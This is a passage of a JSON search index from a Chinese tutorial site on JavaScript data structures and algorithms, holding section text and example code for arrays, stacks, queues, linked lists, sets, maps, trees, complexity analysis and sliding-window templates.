\",\"二维数组的别名就叫“矩阵”\"]},{\"header\":\"1. 二维数组的初始化\",\"slug\":\"_1-二维数组的初始化\",\"contents\":[\"不能使用fill方法来初始化，因为给 fill 传递一个参数时，如果这个参数的类型是引用类型，那么 fill 在填充坑位时填充的其实就是参数的引用\",\"我们可以用for循环来实现：\",\"const len = arr.length; for(let i=0;i<len;i++) { // 将数组的每一个坑位初始化为数组 arr[i] = []; } \",\"也可以使用如下方法实现：\",\"const arr = new Array(n).fill(0).map(() => new Array(n).fill(0)); \"]},{\"header\":\"2. 二维数组的访问\",\"slug\":\"_2-二维数组的访问\",\"contents\":[\"// 缓存外部数组的长度 const outerLen = arr.length for(let i=0;i<outerLen;i++) { // 缓存内部数组的长度 const innerLen = arr[i].length for(let j=0;j<innerLen;j++) { // 输出数组的值，输出数组的索引 console.log(arr[i][j],i,j) } } \",\"一维数组用 for 循环遍历只需一层循环，二维数组是两层，三维数组就是三层。依次类推，N 维数组需要 N 层循环来完成遍历\"]},{\"header\":\"4. 数组常见操作\",\"slug\":\"_4-数组常见操作\",\"contents\":[]},{\"header\":\"1. 数组的增删改查\",\"slug\":\"_1-数组的增删改查\",\"contents\":[]},{\"header\":\"1. 增加元素\",\"slug\":\"_1-增加元素\",\"contents\":[\"// unshift 方法-添加元素到数组的头部 const arr = [1,2] arr.unshift(0) // [0,1,2] \",\"// push 方法-添加元素到数组的尾部 const arr = [1,2] arr.push(3) // [1,2,3] \",\"// splice 方法-添加元素到数组的任何位置 // 第一个参数是起始的索引值，第二个参数表示从起始索引开始需要删除的元素个数，从第三个位置开始的参数，都代表着需要添加到数组里的元素的值 const arr = [1,2] arr.splice(1,0,3) // [1,3,2] \"]},{\"header\":\"2. 删除元素\",\"slug\":\"_2-删除元素\",\"contents\":[\"// pop 方法-删除数组最后的元素 const arr = [1,2] arr.pop() // [1] \",\"// shift 方法-删除数组首位的元素 const arr = [1,2] arr.shift() // [2] \",\"// splice 方法-删除数组任意位置的元素 const arr = [1, 2, 3, 4, 5] //删除索引3位置起两个元素 arr.splice(3, 2) console.log(arr) //[1,2,3] \"]},{\"header\":\"3. 修改元素\",\"slug\":\"_3-修改元素\",\"contents\":[\"//splice()第二个参数为1时，可以修改指定索引位置的元素 let arr = [1, 2, 3, 4, 5] //修改索引1位置的元素为A arr.splice(1, 1, 'A') console.log(arr) //[1, 'A', 3, 4, 5] //splice()第二个参数为n时，可以修改指定索引位置的n个元素 let arr1 = [1, 2, 3, 4, 5] //修改索引1位置开始的两个元素为A、B arr1.splice(1, 2, 'A', 'B') console.log(arr1) //[1, 'A', 'B', 4, 5] \"]},{\"header\":\"4. 查找元素\",\"slug\":\"_4-查找元素\",\"contents\":[\"indexOf，lastIndexOf，find，findIndex，findLast，findLastIndex，includes\",\"let arr = [10, 11, 12, 13, 9] console.log(arr.indexOf(15))//-1 console.log(arr.indexOf(11))//1 console.log(arr.lastIndexOf(15))//-1 console.log(arr.lastIndexOf(11))//1 console.log(arr.includes(10))//true let res1 = arr.find((item) => item > 10) console.log(res1)//11 let res2 = arr.findLast((item) => item > 10) console.log(res2)//13 let res3 = arr.findIndex((item) => item > 10) console.log(res3)//1 let res4 = arr.findLastIndex((item) => item > 10) console.log(res4)//3 \"]},{\"header\":\"2. 数组排序\",\"slug\":\"_2-数组排序\",\"contents\":[\"sort\",\"let arr = [3, 2, 4, 6, 5] arr.sort((x, y) => x - y) console.log(arr) //[2, 3, 4, 5, 6] \",\"let arr = [3, 2, 4, 6, 5] arr.sort((x, y) => y - x) console.log(arr) //[6, 5, 4, 3, 2] \"]},{\"header\":\"3. 数组合并\",\"slug\":\"_3-数组合并\",\"contents\":[\"concat\",\"let arr1 = [1, 2, 3] let arr2 = [4, 5, 6] console.log(arr1.concat(arr2, 7, 8, 9))//[1,2,3,4,5,6,7,8,9] \"]},{\"header\":\"4. 数组迭代方法\",\"slug\":\"_4-数组迭代方法\",\"contents\":[\"every, some, filter, map, forEach, reduce\",\"let arr = [10, 11, 12, 13] let res = arr.every((item) => { return item > 0 }) console.log(res) //true \",\"let arr = [10, 11, 12, 13] let res = arr.some((item) => item > 12) console.log(res) //true \",\"let arr = [10, 11, 12, 13] let res = arr.filter((item) => item > 12) console.log(res) //[13] \",\"let arr = [10, 11, 12, 13] let res = arr.map((item) => item + 'zhf') console.log(res) //['10zhf', '11zhf', '12zhf', '13zhf'] \",\"let arr = [10, 11, 12, 13] arr.forEach((item, index) =>{ console.log(item, index) }) //10 0 //11 1 //12 2 //13 3 \",\"let arr = [10, 11, 12, 13] let res = arr.reduce((item1, item2) => item1 + item2) console.log(res) //46 \"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/02-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E6%A0%88.html\":{\"title\":\"栈\",\"contents\":[{\"header\":\"1. 认识栈结构\",\"slug\":\"_1-认识栈结构\",\"contents\":[\"栈（stack）又名堆栈，它是一种运算受限的线性表。限定仅在表尾进行插入和删除操作的线性表。这一端被称为栈顶，相对地，把另一端称为栈底。向一个栈插入新元素又称作进栈、入栈或压栈，它是把新元素放到栈顶元素的上面，使之成为新的栈顶元素；从一个栈删除元素又称作出栈或退栈，它是把栈顶元素删除掉，使其相邻的元素成为新的栈顶元素\",\"特点：后进先出即Last in First Out（LIFO）\"]},{\"header\":\"2. 用数组表示\",\"slug\":\"_2-用数组表示\",\"contents\":[\"JavaScript中没有栈，但可以使用Array实现栈的所有功能\",\"常用操作：\",\"入栈：push\",\"出栈：pop\",\"栈顶元素：stack[stack.length - 1]\"]},{\"header\":\"3. 封装栈结构\",\"slug\":\"_3-封装栈结构\",\"contents\":[\"//push 添加一个元素到栈顶 //pop 出栈 //peek 返回栈顶 //isEmpty() //clear() //size() //toString() class Stack { #items = [] pop() { return this.#items.pop() } push(data) { this.#items.push(data) } peek() { //return this.#items[this.#items.length - 1] return this.#items.at(-1) } isEmpty() { return this.#items.length === 0 } size() { return this.#items.length } clear() { this.#items = [] } toString() { return this.#items.join('') } } //使用 let stack = new Stack() \"]},{\"header\":\"4. 应用\",\"slug\":\"_4-应用\",\"contents\":[\"进制转换：\",\"function convert(decNumber, base) { let remStack = new Stack() let number = decNumber let string = '' let baseString = '0123456789ABCDEF' while (number > 0) { remStack.push(number % base) number = Math.floor(number / base) } while (!remStack.isEmpty()) { string += baseString[remStack.pop()] } return string } \"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/03-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E9%98%9F%E5%88%97.html\":{\"title\":\"队列\",\"contents\":[{\"header\":\"1. 队列是什么\",\"slug\":\"_1-队列是什么\",\"contents\":[\"队列是一种特殊的线性表，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。队列中没有元素时，称为空队列\",\"队列的数据元素又称为队列元素。在队列中插入一个队列元素称为入队，从队列中删除一个队列元素称为出队。因为队列只允许在一端插入，在另一端删除，所以只有最早进入队列的元素才能最先从队列中删除，故队列又称为先进先出（FIFO—first in first out）线性表\"]},{\"header\":\"2. 用数组表示\",\"slug\":\"_2-用数组表示\",\"contents\":[\"JavaScript中没有队列，但可以用Array实现队列的所有功能\",\"常用操作：\",\"入队：push\",\"出队：shift\",\"队头元素：queue[0]\"]},{\"header\":\"3. 队列的封装\",\"slug\":\"_3-队列的封装\",\"contents\":[\"使用对象，为了提高删除时的效率\",\"obj = {0:1,1:2,2:3} delete obj[0] console.log(obj) //{1:2,2:3} \",\"class Queue { #items = {} #count = 0 #lowCount = 0 //记录队头索引 dequeue() { if(this.isEmpty()){ return undefined } let res = this.#items[this.#lowCount] delete this.#items[this.#lowCount] this.#lowCount++ return res } enqueue(data) { this.#items[this.#count] = data this.#count++ } front() { return this.#items[this.#lowCount] } isEmpty() { return this.size() === 0 } size() { return this.#count-this.#lowCount } clear() { this.#items = {} this.#count = 0 this.#lowCount = 0 } toString() { let str = \\\"\\\" for(let i =this.#lowCount;i<this.#count;i++){ str += `${this.#items[i]} ` } return str } } \"]},{\"header\":\"4. 应用-击鼓传花\",\"slug\":\"_4-应用-击鼓传花\",\"contents\":[\"function game(list,num){ let queue = new Queue() for(let i=0;i<list.length;i++){ queue.enqueue(list[i]) } while(queue.size()>1){ for(let i=0;i<num;i++){ queue.enqueue(queue.dequeue()) } console.log(queue.dequeue(),\\\"淘汰了\\\") } return { winner:queue.dequeue() } } game([\\\"kerwin\\\",\\\"tiechui\\\",\\\"xiaoming\\\",\\\"gangdaner\\\",\\\"guludunzi\\\"],7) \"]},{\"header\":\"5. 双端队列\",\"slug\":\"_5-双端队列\",\"contents\":[\"class DeQueue { #items = {} #lowCount = 0 //记录队头索引 #count = 0 removeFront() { if (this.isEmpty()) { return undefined } let res = this.#items[this.#lowCount] delete this.#items[this.#lowCount] this.#lowCount++ return res } addBack(data) { this.#items[this.#count] = data this.#count++ } addFront(data) { if (this.isEmpty()) { this.addBack(data) } else { if (this.#lowCount > 0) { //#lowCount>0 this.#lowCount-- this.#items[this.#lowCount] = data } else { //#lowCount===0 for (let i = this.#count; i > 0; i--) { this.#items[i] = this.#items[i - 1] } this.#count++ this.#lowCount = 0 this.#items[0] = data } } } removeBack() { if (this.isEmpty()) { return undefined } this.#count-- const result = this.#items[this.#count] delete this.#items[this.#count] return result } peekFront() { return this.#items[this.#lowCount] } peekBack() { if (this.isEmpty()) { return undefined } return this.#items[this.#count - 1] } isEmpty() { return this.size() === 0 } size() { return this.#count - this.#lowCount } clear() { this.#items = {} this.#count = 0 this.#lowCount = 0 } toString() { let str = '' for (let i = this.#lowCount; i < this.#count; i++) { str += `${this.#items[i]} ` } return str } } \"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/04-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8.html\":{\"title\":\"链表\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文部分图片来自：Hello算法，https://www.hello-algo.com/\"]},{\"header\":\"1. 什么是链表\",\"slug\":\"_1-什么是链表\",\"contents\":[\"链表和数组相似，它们都是有序的列表、都是线性结构（有且仅有一个前驱、有且仅有一个后继）\",\"不同点在于，链表中，数据单位的名称叫做“结点”，而结点和结点的分布，在内存中可以是离散的\",\"在链表中，每一个结点的结构都包括了两部分的内容：数据域和指针域\"]},{\"header\":\"2. 链表实现\",\"slug\":\"_2-链表实现\",\"contents\":[\"JS 中的链表，是以嵌套的对象的形式来实现的：\",\"{ // 数据域 val: 1, // 指针域，指向下一个结点 next: { val:2, next: ... } } \",\"数据域存储的是当前结点所存储的数据值，而指针域则代表下一个结点（后继结点）的引用。 有了 next 指针来记录后继结点的引用，每一个结点至少都能知道自己后面的是哪位了，原本相互独立的结点之间就有联系\",\"JS数据结构与算法-链表01.png\",\"要想访问链表中的任何一个元素，我们都得从起点结点开始，逐个访问 next，一直访问到目标结点为止。为了确保起点结点是可抵达的，我们有时还会设定一个 head 指针来专门指向链表的开始位置\",\"JS数据结构与算法-链表02.png\"]},{\"header\":\"1. 链表结点的创建\",\"slug\":\"_1-链表结点的创建\",\"contents\":[\"创建链表结点，需要一个构造函数：\",\"function ListNode(val) { this.val = val; this.next = null; } \",\"在使用构造函数创建结点时，传入 val （数据域对应的值内容）、指定 next （下一个链表结点）即可：\",\"const node = new ListNode(1); node.next = new ListNode(2); \",\"以上，就创建出了一个数据域值为1，next 结点数据域值为2的链表结点：\",\"JS数据结构与算法-链表03.png\"]},{\"header\":\"2. 链表元素的插入\",\"slug\":\"_2-链表元素的插入\",\"contents\":[\"在链表尾部添加：直接将尾部的next指针指向要添加的元素结点即可\",\"在两个结点间插入一个结点：\",\"过程演示：\",\"JS数据结构与算法-链表04.png\",\"代码实现：\",\"// 如果目标结点本来不存在，那么记得手动创建 const P = new ListNode(0); // 把p的 next 指针指向 n1（即 n0.next） P.next = n0.next; // 把n0的 next 指针指向 nodeP n0.next = P; \"]},{\"header\":\"3. 链表元素的删除\",\"slug\":\"_3-链表元素的删除\",\"contents\":[\"我们直接让要删除结点的前驱结点的 next 指针跳过它，指向要删除结点的后继即可\",\"过程演示：\",\"JS数据结构与算法-链表05.png\",\"代码实现：\",\"n0.next = P.next; \"]},{\"header\":\"4. 链表的遍历\",\"slug\":\"_4-链表的遍历\",\"contents\":[\"let p = node; while(p){ console.log(p.val); p = p.next; } \"]},{\"header\":\"3. 链表与数组\",\"slug\":\"_3-链表与数组\",\"contents\":[]},{\"header\":\"1. JS中的数组\",\"slug\":\"_1-js中的数组\",\"contents\":[\"在JS中，如果我们在一个数组中只定义了一种类型的元素，如：\",\"const arr = [1,2,3,4]; \",\"它是一个纯数字数组，那么对应的确实是连续内存\",\"但如果我们定义了不同类型的元素：\",\"const arr = ['haha', 1, {a:1}]; \",\"它对应的就是一段非连续的内存。此时，JS 数组不再具有数组的特征，其底层使用哈希映射分配内存空间，是由对象链表来实现的\"]},{\"header\":\"2. 链表的特点\",\"slug\":\"_2-链表的特点\",\"contents\":[\"有高效的增删操作，但是访问操作很麻烦\",\"// 记录目标结点的位置 const index = 10; // 设一个游标指向链表第一个结点，从第一个结点开始遍历 let node = head; // 反复遍历到第10个结点为止 for(let i=0;i<index&&node;i++) { node = node.next; } \",\"随着链表长度的增加，我们搜索的范围也会变大、遍历其中任意元素的时间成本自然随之提高。这个变化的趋势呈线性规律，用大 O 表示法表示为 O(n)\",\"但在数组中，我们直接访问索引、可以做到一步到位，这个操作的复杂度会被降级为常数级别(O(1))\",\"和数组相比，内存空间消耗更大，因为每个存储数据的结点都需要额外的空间存储后继指针\"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/05-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E9%9B%86%E5%90%88.html\":{\"title\":\"集合\",\"contents\":[{\"header\":\"1. 什么是集合\",\"slug\":\"_1-什么是集合\",\"contents\":[\"集合是由一组无序且唯一（即不能重复）的项组成的\",\"ES6中的set结构就是集合\",\"集合的常用操作：去重、判断某元素是否在集合中、求交集\"]},{\"header\":\"2. 集合的运算\",\"slug\":\"_2-集合的运算\",\"contents\":[\"并集：对于给定的两个集合，返回一个包含两个集合中所有元素的新集合\",\"交集：对于给定的两个集合，返回一个包含两个集合中共有元素的新集合\",\"差集：对于给定的两个集合，返回一个包含所有存在于第一个集合且不存在于第二个集合的元素的新集合\"]},{\"header\":\"3. 集合的基本操作\",\"slug\":\"_3-集合的基本操作\",\"contents\":[\"// 创建集合 let mySet = new Set(); // 增 mySet.add(1); mySet.add(5); mySet.add(5); mySet.add('a'); let o = { a: 1, b: 2 }; mySet.add(o); mySet.add({ a: 1, b: 2 }); console.log(mySet); console.log('------'); // 查 const has = mySet.has(1); console.log(has); console.log('------'); // 删 mySet.delete(5); console.log(mySet); console.log('------'); // 遍历 for (let item of mySet) { console.log(item); } console.log('------'); for (let item1 of mySet.keys()) { console.log(item1); } console.log('------'); for (let item2 of mySet.values()) { console.log(item2); } console.log('------'); for (let item3 of mySet.entries()) { console.log(item3); } console.log('------'); // 集合转换为数组 const myArr = [...mySet]; console.log(myArr); console.log('------'); const myArr1 = Array.from(mySet); console.log(myArr1); console.log('------'); // 数组转换为集合 const mySet2 = new Set([1, 2, 3, 4]); console.log(mySet2); console.log('------'); // 求交集 const intersection = new Set([...mySet].filter((x) => mySet2.has(x))); console.log(intersection); console.log('------'); // 求两个集合的差异 const difference = new Set([...mySet].filter((x) => !mySet2.has(x))); console.log(difference); console.log('------'); \"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/06-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E5%AD%97%E5%85%B8.html\":{\"title\":\"字典\",\"contents\":[{\"header\":\"1. 什么是字典\",\"slug\":\"_1-什么是字典\",\"contents\":[\"字典与集合类似，字典也是一种存储唯一值的数据结构，但它是以键值对的形式来存储\",\"字典也称作映射、符号表或关联数组\",\"ES6中的Map就是一个字典\",\"字典常用操作：键值对的增删改查\"]},{\"header\":\"2. 字典的常用操作\",\"slug\":\"_2-字典的常用操作\",\"contents\":[\"// 创建字典 const m = new Map(); // 增 m.set('a', 'aa'); m.set('b', 'bb'); console.log(m); console.log('------'); // 删除 m.delete('b'); console.log(m); console.log('------'); // 清空 m.clear(); console.log(m); console.log('------'); // 改 m.set('a', 'aaa'); console.log(m); console.log('------'); \"]},{\"header\":\"3. 散列表\",\"slug\":\"_3-散列表\",\"contents\":[\"HashMap类（哈希表），它是字典类的一种散列表实现方式。散列算法的作用是尽可能快地在数据结构中找到一个值\"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/07-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E6%A0%91.html\":{\"title\":\"树\",\"contents\":[{\"header\":\"1. 理解树结构\",\"slug\":\"_1-理解树结构\",\"contents\":[\"数据结构中的树，首先是对现实世界中树的一层简化：把树根抽象为“根结点”，树枝抽象为“边”，树枝的两个端点抽象为“结点”，树叶抽象为“叶子结点”\",\"如图：\",\"JS数据结构与算法-树01.png\",\"相关概念：\",\"树的层次计算规则：根结点所在的那一层记为第一层，其子结点所在的就是第二层，以此类推\",\"结点和树的“高度”计算规则：叶子结点高度记为1，每向上一层高度就加1，逐层向上累加至目标结点时，所得到的的值就是目标结点的高度。树中结点的最大高度，称为“树的高度”\",\"“度”的概念：一个结点开叉出去多少个子树，被记为结点的“度”。比如我们上图中，根结点的“度”就是3\",\"“叶子结点”：叶子结点就是度为0的结点。在上图中，最后一层的结点的度全部为0，所以这一层的结点都是叶子结点\"]},{\"header\":\"2. 深度/广度优先遍历\",\"slug\":\"_2-深度-广度优先遍历\",\"contents\":[\"树的结构：\",\"const tree = { val: 'a', children: [ { val: 'b', children: [ { val: 'd', children: [], }, { val: 'e', children: [], }, ], }, { val: 'c', children: [ { val: 'f', children: [], }, { val: 'g', children: [], }, ], }, ], }; \"]},{\"header\":\"2.1 深度优先遍历\",\"slug\":\"_2-1-深度优先遍历\",\"contents\":[\"尽可能深的搜索树的分支\",\"具体实现步骤：\",\"访问根结点\",\"对根结点的children挨个进行深度优先遍历\",\"编码实现：\",\"const dfs = (root) => { console.log(root.val); root.children.forEach(dfs); }; dfs(tree); \"]},{\"header\":\"2.2 广度优先遍历\",\"slug\":\"_2-2-广度优先遍历\",\"contents\":[\"先访问离根节点最近的结点\",\"具体实现步骤：\",\"新建一个队列，把根节点入队\",\"把队头出队并访问\",\"把队头的children挨个入队\",\"重复第二、三步，直到队列为空\",\"编码实现：\",\"const bfs = (root) => { const q = [root]; while (q.length > 0) { const n = q.shift(); console.log(n.val); n.children.forEach((child) => { q.push(child); }); } }; bfs(tree); \"]},{\"header\":\"3. 理解二叉树结构\",\"slug\":\"_3-理解二叉树结构\",\"contents\":[\"二叉树是指满足以下要求的树：\",\"它可以没有根结点，作为一棵空树存在\",\"如果它不是空树，那么必须由根结点、左子树和右子树组成，且左右子树都是二叉树\",\"如图：\",\"JS数据结构与算法-树02.png\",\"注意：二叉树不能被简单定义为每个结点的度都是2的树。普通的树并不会区分左子树和右子树，但在二叉树中，左右子树的位置是严格约定、不能交换的。对应到图上来看，也就意味着 B 和 C、D 和 E、F 和 G 是不能互换的\"]},{\"header\":\"4. 二叉树的编码实现\",\"slug\":\"_4-二叉树的编码实现\",\"contents\":[\"在JavaScript中，二叉树使用对象来定义。它的结构分为三块：\",\"数据域\",\"左侧子结点（左子树根结点）的引用\",\"右侧子结点（右子树根结点）的引用\",\"在定义二叉树构造函数时，我们需要把左侧子结点和右侧子结点都预置为空：\",\"// 二叉树结点的构造函数 function TreeNode(val) { this.val = val; this.left = this.right = null; } \",\"当你需要新建一个二叉树结点时，直接调用构造函数、传入数据域的值就行了\",\"const node = new TreeNode(1); \",\"如此便能得到一个值为 1 的二叉树结点：\",\"JS数据结构与算法-树03.png\",\"以这个结点为根结点，我们可以通过给 left/right 赋值拓展其子树信息，延展出一棵二叉树。因此从更加细化的角度来看，一棵二叉树的形态实际是这样的：\",\"JS数据结构与算法-树04.png\"]},{\"header\":\"5. 二叉树的遍历\",\"slug\":\"_5-二叉树的遍历\",\"contents\":[\"以一定的顺序规则，逐个访问二叉树的所有结点，这个过程就是二叉树的遍历。按照顺序规则的不同，遍历方式有以下四种：\",\"先序遍历\",\"中序遍历\",\"后序遍历\",\"层次遍历\",\"按照实现方式的不同，遍历方式又可以分为以下两种：\",\"递归遍历（先、中、后序遍历）\",\"迭代遍历（层次遍历）\"]},{\"header\":\"5.1 初识递归遍历\",\"slug\":\"_5-1-初识递归遍历\",\"contents\":[\"编程语言中，函数直接或间接调用函数本身，则该函数称为递归函数\",\"对二叉树的定义，就可以理解为是一个递归式的定义：\",\"它可以没有根结点，作为一棵空树存在\",\"如果它不是空树，那么必须由根结点、左子树和右子树组成，且左右子树都是二叉树\",\"这个定义有着这样的内涵：如果我们想要创建一个二叉树结点作为根结点，那么它左侧的子结点和右侧的子结点也都必须符合二叉树结点的定义，这意味着我们要反复地执行“创建一个由数据域、左右子树组成的结点”这个动作，直到数据被分配完为止\",\"结合这个定义来看，每一棵二叉树都应该由这三部分组成：根节点，左子树和右子树\",\"对树的遍历，就可以看做是对这三个部分的遍历。这里就引出一个问题：三个部分中，到底先遍历哪个、后遍历哪个呢？遍历的可能顺序有三种：\",\"根结点 -> 左子树 -> 右子树\",\"左子树 -> 根结点 -> 右子树\",\"左子树 -> 右子树 -> 根结点\",\"上述三个遍历顺序，就分别对应了二叉树的先序遍历、中序遍历和后序遍历规则。在这三种顺序中，根结点的遍历分别被安排在了首要位置、中间位置和最后位置。所谓的“先序”、“中序”和“后序”，“先”、“中”、“后”其实就是指根结点的遍历时机\"]},{\"header\":\"5.2 编码实现\",\"slug\":\"_5-2-编码实现\",\"contents\":[\"二叉树的结构：\",\"const root = { val: \\\"A\\\", left: { val: \\\"B\\\", left: { val: \\\"D\\\" }, right: { val: \\\"E\\\" } }, right: { val: \\\"C\\\", right: { val: \\\"F\\\" } } } \",\"递归函数的编写要点：\",\"编写一个递归函数之前，我们首先要明确两样东西：\",\"递归式 \",\"递归式，它指的是你每一次重复的内容是什么。如：我们要做先序遍历，那么每一次重复的其实就是 根结点 -> 左子树 -> 右子树 这个旅行路线\",\"递归边界 \",\"递归边界，它指的是你什么时候停下来。在遍历的场景下，当我们发现遍历的目标树为空的时候，就意味着旅途已达终点、需要画上句号了。这个“画句号”的方式，在编码实现里对应着一个 return 语句——这就是二叉树遍历的递归边界\"]},{\"header\":\"5.2.1 先序遍历\",\"slug\":\"_5-2-1-先序遍历\",\"contents\":[\"根结点 -> 左子树 -> 右子树\",\"动画演示：\"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/10-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95.html\":{\"title\":\"排序算法\",\"contents\":[{\"header\":\"1. 冒泡排序\",\"slug\":\"_1-冒泡排序\",\"contents\":[]},{\"header\":\"1.1 基本思路\",\"slug\":\"_1-1-基本思路\",\"contents\":[\"冒泡排序的过程，就是从第一个元素开始，重复比较相邻的两个项，若第一项比第二项更大，则交换两者的位置；反之不动\",\"每一轮操作，都会将这一轮中最大的元素放置到数组的末尾。假如数组的长度是 n，那么当我们重复完 n 轮的时候，整个数组就有序了\"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/10-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E7%AE%97%E6%B3%95%E7%9A%84%E8%A1%A1%E9%87%8F.html\":{\"title\":\"算法的衡量\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"算法的复杂性体现在运行该算法时占用计算机资源的多少上，计算机最重要的资源是时间（CPU）和空间（内存），因此复杂度分为时间和空间复杂度\",\"时间复杂度 T(n) —— 根据算法写成的程序在执行时耗费时间的长度\",\"空间复杂度 S(n) ——根据算法写成的程序在执行时占用存储单元的长度\"]},{\"header\":\"1. 时间复杂度\",\"slug\":\"_1-时间复杂度\",\"contents\":[\"定义：在进行算法分析时，语句总的执行次数 T(n) 是关于问题规模 n 的函数，进而分析 T(n) 随 n 的变化情况并确定 T(n) 的数量级，即算法运行时间随着数据量变大时的增长趋势\"]},{\"header\":\"1.1 函数渐近上界\",\"slug\":\"_1-1-函数渐近上界\",\"contents\":[\"设算法 计算操作数量 为 T(n) ，其是一个关于输入数据大小 n 的函数\",\"例如，某算法的操作数量为 T(n) = 3 + 2n，T(n) 是个一次函数，说明时间增长趋势是线性的，因此易得时间复杂度是线性阶，我们将线性阶的时间复杂度记为 O(n)，这个数学符号被称为 大O记号，代表函数 T(n) 的 渐近上界\",\"我们要推算时间复杂度，本质上是在计算 操作数量函数 T(n) 的渐近上界 本质上看，计算 渐近上界 就是在找一个函数 f(n) ，使得在 n 趋向于无穷大时，T(n) 和 f(n) 处于相同的增长级别（仅相差一个常数项 c 的倍数）\"]},{\"header\":\"1.2 推算大O阶的方法\",\"slug\":\"_1-2-推算大o阶的方法\",\"contents\":[\"推算出 f(n) 后，我们就得到时间复杂度 O(f(n)) 首先 统计操作数量，然后 判断渐近上界 即可确定渐近上界 f(n)\"]},{\"header\":\"1.2.1 统计操作数量\",\"slug\":\"_1-2-1-统计操作数量\",\"contents\":[\"对着代码，从上到下一行一行地计数即可。操作数量 T(n) 中的各种系数、常数项都可以被忽略。根据此原则，可以总结出以下计数技巧：\",\"跳过数量与 n 无关的操作。因为他们都是 T(n) 中的常数项，对时间复杂度不产生影响\",\"省略所有系数。例如，循环 2n次、5n+1 次、……，都可以化简记为 n 次，因为 n 前面的系数对时间复杂度也不产生影响\",\"循环嵌套时使用乘法。总操作数量等于外层循环和内层循环操作数量之积，每一层循环依然可以分别套用上述 1. 和 2. 技巧\",\"根据以下示例，使用上述技巧得到的统计结果为 T (n) = n2 + n\",\"let a = 1 // +0（技巧 1） a = a + n // +0（技巧 1） // +n（技巧 2） for(let i=0;i<5*n+1;i++){ console.log(0) } // +n*n（技巧 3） for(let i=0;i<2*n;i++){ for(let j=0;j<n+1;j++){ console.log(0) } } \"]},{\"header\":\"1.2.2 判断渐近上界\",\"slug\":\"_1-2-2-判断渐近上界\",\"contents\":[\"时间复杂度由多项式 T(n) 中最高阶的项来决定。这是因为在 n 趋于无穷大时，最高阶的项将处于主导作用，其它项的影响都可以被忽略\",\"因此上述例子推出的时间复杂度结果为 O(n2)\"]},{\"header\":\"1.3 常见类型\",\"slug\":\"_1-3-常见类型\",\"contents\":[\"时间复杂度按数量级递增顺序为：\",\"常数阶 O (1)<对数阶 O (logn )<线性阶 O (n)<线性对数阶 O (nlogn )<平方阶 O (n2)<立方阶 O (n3)<k 次方阶 O (nk)<指数阶 O (2n)<O (n!)<O (nn)\"]},{\"header\":\"2. 空间复杂度\",\"slug\":\"_2-空间复杂度\",\"contents\":[\"常见的空间复杂度有O(1)、O(n) 和 O(n2)\"]}]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/11-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF.html\":{\"title\":\"经典算法模板\",\"contents\":[{\"header\":\"1. 滑动窗口算法\",\"slug\":\"_1-滑动窗口算法\",\"contents\":[]},{\"header\":\"1. 应用场景\",\"slug\":\"_1-应用场景\",\"contents\":[\"关键词：满足xxx条件（计算结果、出现次数、同时包含）、最长/最短、子串/子数组/子序列\"]},{\"header\":\"2. 使用思路\",\"slug\":\"_2-使用思路\",\"contents\":[]},{\"header\":\"1. 寻找最长\",\"slug\":\"_1-寻找最长\",\"contents\":[\"核心：左右双指针（L，R）在起始点，R向右逐位滑动循环\",\"每次滑动过程中\",\"如果：窗内元素满足条件，R向右扩大窗口，并更新最优结果\",\"如果：窗内元素不满足条件，L向右缩小窗口\",\"R到达结尾\"]},{\"header\":\"2. 寻找最短\",\"slug\":\"_2-寻找最短\",\"contents\":[\"核心：左右双指针（L，R）在起始点，R向右逐位滑动循环\",\"每次滑动过程中 \",\"如果：窗内元素满足条件，L向右缩小窗口，并更新最优结果\",\"如果：窗内元素不满足条件，R向右扩大窗口\",\"R到达结尾\"]},{\"header\":\"3. 模板代码\",\"slug\":\"_3-模板代码\",\"contents\":[\"寻找最长的模板\",\"初始化1eft,right,result,bestResult while(右指针没有到结尾){ 窗口扩大，加入right对应元素，更新当前result while(result不满足要求){ 窗口缩小，移除1eft对应元素，1eft右移 } 更新最优结果bestResult right++; } 返回bestResult; \",\"寻找最短的模板\",\"初始化left,right,result,bestResult while(右指针没有到结尾){ 窗口扩大，加入right对应元素，更新当前result while(result满足要求){ 更新最优结果bestResult 窗口缩小，移除1eft对应元素，1eft右移 } right++; } 返回bestResult; \"]}]},\"/data-structures-and-algorithms/leetcode-solution/01-leetcode%E9%A2%98%E8%A7%A3-%E6%95%B0%E7%BB%84.html\":{\"title\":\"数组\",\"contents\":[{\"header\":\"1. 【704】二分查找\",\"slug\":\"_1-【704】二分查找\",\"contents\":[]},{\"header\":\"1. 